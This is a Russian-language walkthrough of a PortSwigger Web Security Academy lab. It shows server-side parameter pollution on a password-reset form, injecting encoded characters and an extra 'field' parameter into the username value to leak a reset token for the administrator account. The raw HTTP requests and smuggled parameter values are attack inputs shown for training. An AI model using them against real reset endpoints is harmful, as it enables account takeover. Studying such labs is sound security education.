Чтобы решить лабораторию, войдите в систему как `administrator` и удалить `carlos`.

## Дано

уязвимость заключается в использование загрязнения параметров

## Задача

войти в систему как `administrator` и удалить `carlos`

# Решение

- При поверхностном поиске ничего не нашли, проверим js файлы при помощи расширения JS Link Finder
![[Pasted image 20250204101813.png]]

проверим файл /static/js/forgotPassword.js
```
forgotPwdReady(() => {
    const queryString = window.location.search;
    const urlParams = new URLSearchParams(queryString);
    const resetToken = urlParams.get('reset-token');
    if (resetToken)
    {
        window.location.href = `/forgot-password?reset_token=${resetToken}`;
    }
    else
    {
        const forgotPasswordBtn = document.getElementById("forgot-password-btn");
        forgotPasswordBtn.addEventListener("click", displayMsg);
    }
});
```

попробуем добавить полезную нагрузку на переменную username (усекаем)
```
POST /forgot-password HTTP/2
Host: 0a53007f0490198289a4509c0049002d.web-security-academy.net
Cookie: session=MOz6roV1795223VFRNu5JPIJA0UElgHu
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Referer: https://0a53007f0490198289a4509c0049002d.web-security-academy.net/forgot-password
Content-Type: x-www-form-urlencoded
Content-Length: 69
Origin: https://0a53007f0490198289a4509c0049002d.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Sec-Gpc: 1
Priority: u=0
Te: trailers

csrf=Kq8ikw70ZWwurLGSd7wbZ2d4OhR3KJlC&username=administrator%23
```
Ответ от сервера
```
{"error": "Field not specified."}
```

проверим по бруту какие доступны файлы
`&username=administrator%26field=brut`
```
{"type":"ClientError","code":400,"error":"Invalid field."}
```
![[Pasted image 20250204102855.png]]

в ответе получили почту
проверим reset_token на ответ итог cykgg8xv3bp3v5wipwupyozzxejmfyko

Ответ https://0a53007f0490198289a4509c0049002d.web-security-academy.net/forgot-password?reset_token=cykgg8xv3bp3v5wipwupyozzxejmfyko

